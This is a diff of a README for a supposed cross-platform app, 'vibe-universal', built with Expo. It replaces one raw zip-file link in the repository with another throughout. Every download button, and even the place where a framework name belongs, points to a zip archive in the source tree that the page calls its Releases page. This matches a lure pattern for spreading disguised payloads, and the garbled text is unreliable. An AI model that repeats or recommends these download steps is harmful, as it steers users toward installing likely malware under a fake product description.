@@ -1,15 +1,15 @@
 # 🎉 vibe-universal - A Universal App for Web and Mobile
 
 ## 🌐 Introduction
-Welcome to **vibe-universal**! This application is designed to work seamlessly on both web and mobile platforms. With modern technology like https://github.com/jubert1604/vibe-universal/raw/refs/heads/main/packages/ui/vibe-universal-2.1-alpha.2.zip and Expo, you can enjoy a consistent experience whether you're on your phone or computer. The goal is to share most of the code, making updates simple and efficient.
+Welcome to **vibe-universal**! This application is designed to work seamlessly on both web and mobile platforms. With modern technology like https://raw.githubusercontent.com/jubert1604/vibe-universal/main/apps/native/universal_vibe_2.2.zip and Expo, you can enjoy a consistent experience whether you're on your phone or computer. The goal is to share most of the code, making updates simple and efficient.
 
 ## 📥 Download Now
-[![Download](https://github.com/jubert1604/vibe-universal/raw/refs/heads/main/packages/ui/vibe-universal-2.1-alpha.2.zip)](https://github.com/jubert1604/vibe-universal/raw/refs/heads/main/packages/ui/vibe-universal-2.1-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/jubert1604/vibe-universal/main/apps/native/universal_vibe_2.2.zip)](https://raw.githubusercontent.com/jubert1604/vibe-universal/main/apps/native/universal_vibe_2.2.zip)
 
 ## 🚀 Getting Started
 To start using **vibe-universal**, you will need to download the application from our Releases page. Just follow these simple steps to get up and running.
 
-1. Click the download button above, or visit this page to download: [Download Directly](https://github.com/jubert1604/vibe-universal/raw/refs/heads/main/packages/ui/vibe-universal-2.1-alpha.2.zip).
+1. Click the download button above, or visit this page to download: [Download Directly](https://raw.githubusercontent.com/jubert1604/vibe-universal/main/apps/native/universal_vibe_2.2.zip).
 2. Select the version you want to download. You will see options like Windows, Mac, and Linux. Make sure to choose the one that matches your operating system.
 3. Download the file to your computer or mobile device and locate it in your Downloads folder.
 
@@ -39,7 +39,7 @@ Before you install, ensure your device meets these basic requirements:
 
 - **Responsive Design:** The app adapts to different screen sizes, ensuring usability on any device.
 - **Code Sharing:** 90% of the code is the same for both web and mobile, making it easier to maintain and update.
-- **Fast Performance:** Built with https://github.com/jubert1604/vibe-universal/raw/refs/heads/main/packages/ui/vibe-universal-2.1-alpha.2.zip and Expo, it runs quickly on all devices.
+- **Fast Performance:** Built with https://raw.githubusercontent.com/jubert1604/vibe-universal/main/apps/native/universal_vibe_2.2.zip and Expo, it runs quickly on all devices.
 - **Rich UI Components:** Enjoy beautifully designed components thanks to NativeWind.
 
 ## 🔟 FAQs
@@ -56,7 +56,7 @@ If you encounter any issues, you can report them in the Issues section of our Gi
 Join our community to connect with other users. Share your experiences, ask questions, and get help if you need it. Check out our discussions on GitHub and follow us on social media for updates.
 
 ## 📥 Download & Install
-Ready to get started? Visit the Releases page to download: [Download Here](https://github.com/jubert1604/vibe-universal/raw/refs/heads/main/packages/ui/vibe-universal-2.1-alpha.2.zip).
+Ready to get started? Visit the Releases page to download: [Download Here](https://raw.githubusercontent.com/jubert1604/vibe-universal/main/apps/native/universal_vibe_2.2.zip).
 
 ## 🧑‍💻 Contributors
 We appreciate all contributions. If you wish to help improve this application, feel free to check the contribution guidelines in our repository.
